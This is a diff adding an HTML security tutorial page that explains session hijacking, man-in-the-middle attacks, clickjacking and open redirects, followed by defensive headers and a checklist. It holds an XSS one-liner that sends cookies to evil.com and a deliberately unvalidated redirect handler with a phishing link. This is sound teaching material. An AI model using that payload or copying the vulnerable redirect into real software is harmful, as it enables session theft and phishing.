@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Session Hijacking &amp; More Attacks</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0f0f17;--surface:#1a1a2e;--surface2:#23234a;--text:#cdd6f4;--muted:#6c7086;
+  --blue:#89b4fa;--green:#a6e3a1;--red:#f38ba8;--yellow:#f9e2af;--peach:#fab387;
+  --teal:#94e2d5;--pink:#f5c2e7;--lavender:#b4befe;--radius:8px;--orange:#f8bd7f;
+  --coral:#f28fad;--header-bg:#1e1e36;
+}
+body{font-family:system-ui,'Segoe UI',sans-serif;background:var(--bg);color:var(--text);line-height:1.6;padding-bottom:60px}
+nav{background:var(--header-bg);padding:14px 24px;display:flex;align-items:center;gap:14px;border-bottom:1px solid var(--surface2);position:sticky;top:0;z-index:100}
+nav .logo{font-weight:700;font-size:1.1rem}
+nav .logo span{color:var(--orange)}
+nav .crumbs{font-size:.78rem;color:var(--muted)}
+nav .crumbs a{color:var(--blue);text-decoration:none}
+.container{max-width:1000px;margin:0 auto;padding:24px 20px}
+
+.section-title{font-size:1.4rem;font-weight:700;margin:36px 0 14px;color:var(--yellow);display:flex;align-items:center;gap:10px}
+.section-title .num{background:var(--surface2);color:var(--muted);font-size:.75rem;padding:2px 10px;border-radius:20px}
+
+.card{background:var(--surface);border:1px solid var(--surface2);border-radius:var(--radius);padding:20px;margin-bottom:18px}
+.card h3{color:var(--blue);margin-bottom:8px;font-size:1rem}
+.card p{color:var(--muted);font-size:.88rem;margin-bottom:8px}
+
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px}
+@media(max-width:680px){.grid2,.grid3{grid-template-columns:1fr}}
+
+.code{background:#0a0a14;border-radius:6px;padding:12px 14px;font-family:monospace;font-size:.78rem;overflow-x:auto;border:1px solid var(--surface2);line-height:1.7;margin:8px 0}
+.code .comment{color:var(--muted)}
+.code .keyword{color:var(--blue)}
+.code .string{color:var(--green)}
+.code .danger{color:var(--red);font-weight:700}
+
+.badge{display:inline-block;padding:2px 10px;border-radius:12px;font-size:.72rem;font-weight:600}
+.badge.red{background:rgba(243,139,168,.18);color:var(--red)}
+.badge.blue{background:rgba(137,180,250,.18);color:var(--blue)}
+.badge.green{background:rgba(166,227,161,.18);color:var(--green)}
+.badge.yellow{background:rgba(249,226,175,.18);color:var(--yellow)}
+.badge.pink{background:rgba(245,194,231,.18);color:var(--pink)}
+.badge.peach{background:rgba(250,179,135,.18);color:var(--peach)}
+
+.callout{padding:12px 16px;border-radius:var(--radius);margin:12px 0;font-size:.84rem;border-left:4px solid var(--blue);background:rgba(137,180,250,.04)}
+.callout.danger{border-color:var(--red);background:rgba(243,139,168,.06)}
+.callout.warn{border-color:var(--yellow);background:rgba(249,226,175,.06)}
+.callout.success{border-color:var(--green);background:rgba(166,227,161,.06)}
+
+.flow{display:flex;align-items:center;gap:6px;flex-wrap:wrap;justify-content:center;padding:10px 0}
+.flow-node{background:var(--surface2);padding:8px 14px;border-radius:var(--radius);font-size:.8rem;text-align:center}
+.flow-node.red{background:var(--red);color:white}
+.flow-node.green{background:var(--green);color:#0f0f17}
+.flow-node.blue{background:var(--blue);color:#0f0f17}
+.flow-node.yellow{background:var(--yellow);color:#0f0f17}
+.flow-arrow{color:var(--muted);font-size:1rem}
+
+.attack-card{border-top:3px solid var(--red);padding:16px;background:var(--bg);border-radius:var(--radius);margin:12px 0}
+.attack-card h4{color:var(--red);margin-bottom:6px}
+.attack-card p{font-size:.82rem;color:var(--muted)}
+
+.demo-box{min-height:50px;padding:12px;background:var(--bg);border-radius:6px;border:1px dashed var(--surface2);margin:8px 0;font-size:.84rem}
+.demo-box.hit{border-color:var(--red);background:rgba(243,139,168,.05)}
+
+.btn{padding:8px 18px;border-radius:6px;border:none;font-weight:600;cursor:pointer;font-size:.82rem;transition:.15s}
+.btn.danger{background:var(--red);color:white}
+.btn.danger:hover{opacity:.85}
+.btn.outline{background:transparent;border:1px solid var(--surface2);color:var(--text)}
+.btn.outline:hover{background:var(--surface2)}
+.btn.blue{background:var(--blue);color:#0f0f17}
+
+table{width:100%;border-collapse:collapse;font-size:.84rem}
+th,td{padding:10px 12px;text-align:left;border-bottom:1px solid var(--surface2)}
+th{color:var(--muted);font-weight:600;font-size:.75rem;text-transform:uppercase}
+tr:hover td{background:rgba(255,255,255,.02)}
+
+.toggle-group{display:flex;gap:6px;margin:8px 0;flex-wrap:wrap}
+.toggle-btn{padding:6px 14px;border-radius:20px;border:1px solid var(--surface2);background:transparent;color:var(--muted);cursor:pointer;font-size:.76rem;transition:.15s}
+.toggle-btn.active{background:var(--blue);color:#0f0f17}
+
+/* Clickjacking visual */
+.clickjack-stage{position:relative;width:100%;height:260px;background:var(--bg);border-radius:var(--radius);border:1px solid var(--surface2);margin:14px 0;overflow:hidden}
+.clickjack-stage .innocent{position:absolute;top:10px;left:10px;right:10px;bottom:10px;background:rgba(166,227,161,.05);border:2px solid var(--green);border-radius:6px;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:1}
+.clickjack-stage .innocent h4{color:var(--green)}
+.clickjack-stage .innocent .fake-btn{padding:12px 30px;background:var(--green);color:#0f0f17;border-radius:6px;font-weight:700;margin-top:8px;cursor:pointer}
+.clickjack-stage .hidden-layer{position:absolute;top:0;left:0;right:0;bottom:0;opacity:.85;z-index:2;display:flex;flex-direction:column;align-items:center;justify-content:center}
+.clickjack-stage .hidden-layer iframe{width:100%;height:100%;border:none;opacity:.001;pointer-events:auto}
+.clickjack-stage .hidden-layer .label{background:var(--red);color:white;padding:4px 10px;border-radius:4px;font-size:.72rem;font-weight:600;margin-top:4px}
+
+/* Tab style */
+.tab-bar{display:flex;gap:0;border-bottom:2px solid var(--surface2);margin-bottom:14px}
+.tab-btn{padding:8px 16px;border:none;background:transparent;color:var(--muted);cursor:pointer;font-size:.82rem;border-bottom:2px solid transparent;margin-bottom:-2px;transition:.15s}
+.tab-btn.active{color:var(--orange);border-bottom-color:var(--orange);font-weight:600}
+.tab-content{display:none}
+.tab-content.active{display:block}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="logo"><span>&#128373;</span> Session Hijacking &amp; More</div>
+  <div class="crumbs"><a href="index.html">SECURITY</a> &rsaquo; More Attacks</div>
+  <div style="margin-left:auto;font-size:.7rem;padding:2px 8px;border-radius:12px;background:rgba(243,139,168,.18);color:var(--red)">Variety</div>
+</nav>
+
+<div class="container">
+
+<div class="section-title"><span class="num">1</span> Session Hijacking</div>
+<div class="card">
+  <p><strong>Session hijacking</strong> (or cookie hijacking) occurs when an attacker steals a user's session cookie and uses it to impersonate them. The server sees the valid cookie and thinks the attacker is the legitimate user.</p>
+  <div class="flow">
+    <div class="flow-node">&#128100; Victim logs in</div>
+    <div class="flow-arrow">&#8594;</div>
+    <div class="flow-node blue">Server</div>
+    <div class="flow-arrow">&#8594;</div>
+    <div class="flow-node" style="background:var(--yellow);color:#0f0f17">Cookie set</div>
+    <div class="flow-arrow">&#8594;</div>
+    <div class="flow-node red">Attacker steals cookie</div>
+    <div class="flow-arrow">&#8594;</div>
+    <div class="flow-node red">Attacker impersonates!</div>
+  </div>
+</div>
+
+<div class="grid2">
+  <div class="card" style="border-top:3px solid var(--red)">
+    <h3>&#128520; How cookies are stolen</h3>
+    <ul style="padding-left:18px;font-size:.84rem;line-height:2.2">
+      <li><strong>XSS:</strong> <code>&lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;</code></li>
+      <li><strong>MITM:</strong> Sniff unencrypted HTTP traffic on public WiFi</li>
+      <li><strong>Malware:</strong> Read browser cookie stores</li>
+      <li><strong>Session fixation:</strong> Force victim to use attacker's session ID</li>
+      <li><strong>Physical access:</strong> Unlocked computer</li>
+    </ul>
+  </div>
+  <div class="card" style="border-top:3px solid var(--green)">
+    <h3>&#10003; How to prevent</h3>
+    <ul style="padding-left:18px;font-size:.84rem;line-height:2.2">
+      <li><strong>HttpOnly</strong> — blocks XSS-based theft</li>
+      <li><strong>Secure</strong> — blocks MITM sniffing</li>
+      <li><strong>HTTPS + HSTS</strong> — encrypts all traffic</li>
+      <li><strong>Regenerate session ID</strong> after login</li>
+      <li><strong>CSRF tokens</strong> — even with cookie, can't forge requests</li>
+      <li><strong>Fingerprinting</strong> — detect unusual access patterns</li>
+    </ul>
+  </div>
+</div>
+
+<div class="callout danger">
+  <strong>&#9888; Session hijacking is the #1 reason for HttpOnly.</strong> Without it, a single XSS vulnerability gives the attacker full access to every session cookie.
+</div>
+
+<!-- ============================================ -->
+<!-- MITM -->
+<!-- ============================================ -->
+<div class="section-title"><span class="num">2</span> Man-in-the-Middle (MITM)</div>
+<div class="card">
+  <p>An attacker intercepts communication between client and server. They can <strong>read</strong> (sniff) and <strong>modify</strong> traffic.</p>
+  <div class="grid2">
+    <div>
+      <div class="flow" style="font-size:.82rem;flex-direction:column;align-items:stretch;gap:8px">
+        <div style="text-align:center;padding:8px;background:rgba(137,180,250,.1);border-radius:6px;border:1px solid rgba(137,180,250,.2)">&#128187; You &#8594; bank.com</div>
+        <div style="text-align:center;padding:8px;background:rgba(243,139,168,.1);border-radius:6px;border:1px solid rgba(243,139,168,.2)">&#128373; <strong>Attacker</strong> (reads everything!)</div>
+        <div style="text-align:center;padding:8px;background:rgba(166,227,161,.1);border-radius:6px;border:1px solid rgba(166,227,161,.2)">&#127974; Server (sees attacker, not you)</div>
+      </div>
+    </div>
+    <div>
+      <p><strong>Common MITM scenarios:</strong></p>
+      <ul style="padding-left:18px;font-size:.84rem;line-height:2">
+        <li>Public WiFi (coffee shop, airport)</li>
+        <li>Compromised router</li>
+        <li>DNS spoofing</li>
+        <li>ARP poisoning</li>
+        <li>Evil twin hotspot</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div class="card">
+  <h3>&#9654; MITM Attack simulation</h3>
+  <div class="grid2">
+    <div>
+      <p style="font-size:.82rem;color:var(--muted)">On <strong>HTTP</strong> (no encryption):</p>
+      <div class="demo-box hit" style="font-family:monospace;font-size:.76rem">
+        <span style="color:var(--red)">&#10007; Captured by attacker!</span><br>
+        POST /login HTTP/1.1<br>
+        Host: bank.com<br>
+        <span style="color:var(--yellow)">password=secret123&session=abc</span>
+      </div>
+    </div>
+    <div>
+      <p style="font-size:.82rem;color:var(--muted)">On <strong>HTTPS</strong> (encrypted):</p>
+      <div class="demo-box" style="font-family:monospace;font-size:.76rem">
+        <span style="color:var(--green)">&#10003; Encrypted — attacker sees gibberish</span><br>
+        POST /login HTTP/1.1<br>
+        Host: bank.com<br>
+        <span style="color:var(--muted)">&#x1f4ad;&#x1f4ad;&#x1f4ad;&#x1f4ad;&#x1f4ad;&#x1f4ad;&#x1f4ad;&#x1f4ad;&#x1f4ad;&#x1f4ad;</span>
+      </div>
+    </div>
+  </div>
+  <div class="callout success" style="font-size:.82rem">
+    <strong>Defense:</strong> HTTPS + <strong>HSTS</strong> (HTTP Strict Transport Security) ensures the browser never falls back to HTTP. The <strong>Secure</strong> cookie flag ensures cookies are never sent over HTTP.
+  </div>
+</div>
+
+<!-- ============================================ -->
+<!-- CLICKJACKING -->
+<!-- ============================================ -->
+<div class="section-title"><span class="num">3</span> Clickjacking</div>
+<div class="card">
+  <p><strong>Clickjacking</strong> tricks users into clicking something different from what they see. The attacker loads the target site in a <strong>transparent iframe</strong> overlaid on a decoy page.</p>
+  <div class="grid2">
+    <div>
+      <div class="clickjack-stage">
+        <div class="innocent">
+          <h4>Win a free iPhone!</h4>
+          <p style="font-size:.78rem;color:var(--muted)">Click the button below to claim your prize</p>
+          <div class="fake-btn">&#128525; Claim Now</div>
+          <div style="font-size:.7rem;color:var(--muted);margin-top:6px">(What the user sees)</div>
+        </div>
+        <div class="hidden-layer">
+          <div style="width:100%;height:100%;background:rgba(243,139,168,.08);border:2px dashed var(--red);display:flex;align-items:center;justify-content:center;flex-direction:column">
+            <div style="font-size:.82rem;color:var(--red);font-weight:600">&#128520; Hidden transparent iframe</div>
+            <div style="font-size:.72rem;color:var(--muted)">facebook.com/delete-account</div>
+            <div style="font-size:.7rem;color:var(--muted)">(Invisible — user doesn't see this)</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div>
+      <p><strong>How it works:</strong></p>
+      <ol style="padding-left:18px;font-size:.84rem;line-height:2">
+        <li>Attacker creates an innocent-looking page</li>
+        <li>Overlays a transparent iframe pointing to victim site</li>
+        <li>Aligns the iframe so "Claim Now" button is over "Delete" button</li>
+        <li>User clicks — thinks they're claiming a prize</li>
+        <li>Actually clicked "Delete Account" on the hidden iframe</li>
+      </ol>
+      <div class="callout success" style="font-size:.8rem;margin-top:8px">
+        <strong>Defense:</strong> Set <code>X-Frame-Options: DENY</code> or use CSP <code>frame-ancestors 'none'</code> to prevent your site from being iframed.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================ -->
+<!-- OPEN REDIRECT -->
+<!-- ============================================ -->
+<div class="section-title"><span class="num">4</span> Open Redirect</div>
+<div class="card">
+  <p>An attacker uses a vulnerable redirect on a trusted domain to send users to a malicious site. Users trust the familiar domain and click.</p>
+  <div class="grid2">
+    <div>
+      <div class="code" style="font-size:.76rem">
+<span class="comment">// VULNERABLE redirect:</span>
+app.get(<span class="string">'/redirect'</span>, (req, res) => {
+  res.redirect(req.query.url);
+  <span class="comment">// No validation!</span>
+});
+<span class="comment">// Attacker sends:</span>
+<a href="<span class="danger">https://bank.com/redirect?url=https://evil.com/login</span>">
+  Sign in to your account
+</a>
+      </div>
+    </div>
+    <div>
+      <div class="demo-box" style="font-size:.82rem">
+        <strong style="color:var(--muted)">What the user sees in the address bar:</strong><br>
+        <span style="color:var(--green)">https://bank.com/redirect?url=...</span><br>
+        <span style="font-size:.72rem;color:var(--muted)">Looks safe — it's bank.com!</span><br><br>
+        <strong style="color:var(--red)">Where they actually end up:</strong><br>
+        <span style="color:var(--red)">https://evil.com/phishing-page</span>
+      </div>
+      <div class="callout warn" style="font-size:.8rem;margin-top:6px">
+        <strong>Often used for</strong> phishing (fake login pages) and bypassing URL scanners.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================ -->
+<!-- CSP / HSTS -->
+<!-- ============================================ -->
+<div class="section-title"><span class="num">5</span> Other Key Defenses</div>
+
+<div class="grid2">
+  <div class="card" style="border-top:3px solid var(--blue)">
+    <h3>CSP (Content Security Policy)</h3>
+    <p>A browser security header that controls which resources can load on your page. Blocks inline scripts, restricts domains, and prevents XSS even if injection occurs.</p>
+    <div class="code" style="font-size:.73rem">
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' https://cdn.example.com;
+  style-src 'self' 'unsafe-inline';
+  img-src *;
+  frame-ancestors 'none';
+    </div>
+    <p style="font-size:.78rem;color:var(--muted)">Example: Blocks inline <code>&lt;script&gt;</code> tags, only allows scripts from your domain.</p>
+  </div>
+  <div class="card" style="border-top:3px solid var(--green)">
+    <h3>HSTS (HTTP Strict Transport Security)</h3>
+    <p>Forces the browser to always use HTTPS for your domain. Prevents MITM downgrade attacks (SSL stripping).</p>
+    <div class="code" style="font-size:.73rem">
+Strict-Transport-Security:
+  max-age=31536000;
+  includeSubDomains;
+  preload
+    </div>
+    <p style="font-size:.78rem;color:var(--muted)">Once set, browser refuses HTTP connections to your site for <code>max-age</code> seconds.</p>
+  </div>
+  <div class="card" style="border-top:3px solid var(--yellow)">
+    <h3>X-Frame-Options</h3>
+    <p>Prevents your site from being embedded in iframes on other domains (clickjacking protection).</p>
+    <div class="code" style="font-size:.73rem">
+X-Frame-Options: DENY
+<span class="comment">// or: SAMEORIGIN (allows same-domain iframes)</span>
+    </div>
+  </div>
+  <div class="card" style="border-top:3px solid var(--pink)">
+    <h3>Subresource Integrity (SRI)</h3>
+    <p>Ensures external scripts/styles haven't been tampered with. Browser compares hash of fetched file with expected hash.</p>
+    <div class="code" style="font-size:.73rem">
+&lt;script src="https://cdn.example.com/lib.js"
+  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
+  crossorigin="anonymous"&gt;
+    </div>
+  </div>
+</div>
+
+<!-- ============================================ -->
+<!-- ATTACK COMPARISON -->
+<!-- ============================================ -->
+<div class="section-title"><span class="num">6</span> All Attacks Comparison</div>
+<div class="card">
+  <table>
+    <tr><th>Attack</th><th>What it does</th><th>Primary vector</th><th>Key defense</th><th>Severity</th></tr>
+    <tr>
+      <td><strong style="color:var(--red)">Session Hijacking</strong></td>
+      <td>Steal &amp; reuse session cookie</td>
+      <td>XSS / sniffing / malware</td>
+      <td>HttpOnly + Secure + HTTPS</td>
+      <td><span class="badge red">Critical</span></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--red)">MITM</strong></td>
+      <td>Intercept &amp; read/modify traffic</td>
+      <td>Public WiFi / compromised router</td>
+      <td>HTTPS + HSTS</td>
+      <td><span class="badge red">Critical</span></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--orange)">Clickjacking</strong></td>
+      <td>Trick clicks via transparent overlay</td>
+      <td>Malicious iframe</td>
+      <td>X-Frame-Options / CSP</td>
+      <td><span class="badge orange">High</span></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--yellow)">Open Redirect</strong></td>
+      <td>Redirect to malicious site via trusted domain</td>
+      <td>Unvalidated redirect params</td>
+      <td>Whitelist URLs / validate paths</td>
+      <td><span class="badge yellow">Medium</span></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--blue)">Session Fixation</strong></td>
+      <td>Force victim to use attacker's session ID</td>
+      <td>Pre-set session ID in URL</td>
+      <td>Regenerate ID after login</td>
+      <td><span class="badge yellow">Medium</span></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--pink)">CSP Bypass</strong></td>
+      <td>Bypass Content Security Policy</td>
+      <td>JSONP / known CDN gadgets</td>
+      <td>Strict CSP + 'strict-dynamic'</td>
+      <td><span class="badge yellow">Medium</span></td>
+    </tr>
+  </table>
+</div>
+
+<!-- ============================================ -->
+<!-- ALL DEFENSES -->
+<!-- ============================================ -->
+<div class="section-title"><span class="num">7</span> Complete Defense Checklist</div>
+<div class="card">
+  <div class="grid3" style="font-size:.82rem">
+    <div style="padding:10px;background:var(--bg);border-radius:6px;border:1px solid var(--surface2)">
+      <strong style="color:var(--green)">&#10003; Cookies</strong>
+      <div style="margin-top:4px;line-height:2">
+        <span class="badge green">HttpOnly</span><br>
+        <span class="badge green">Secure</span><br>
+        <span class="badge green">SameSite=Lax</span><br>
+        <span class="badge green">Max-Age</span>
+      </div>
+    </div>
+    <div style="padding:10px;background:var(--bg);border-radius:6px;border:1px solid var(--surface2)">
+      <strong style="color:var(--blue)">&#10003; Headers</strong>
+      <div style="margin-top:4px;line-height:2">
+        <span class="badge blue">CSP</span><br>
+        <span class="badge blue">HSTS</span><br>
+        <span class="badge blue">X-Frame-Options</span><br>
+        <span class="badge blue">X-Content-Type-Options</span>
+      </div>
+    </div>
+    <div style="padding:10px;background:var(--bg);border-radius:6px;border:1px solid var(--surface2)">
+      <strong style="color:var(--yellow)">&#10003; Practices</strong>
+      <div style="margin-top:4px;line-height:2">
+        <span class="badge yellow">Input sanitization</span><br>
+        <span class="badge yellow">Output encoding</span><br>
+        <span class="badge yellow">HTTPS everywhere</span><br>
+        <span class="badge yellow">CSRF tokens</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /container -->
+</body>
+</html>
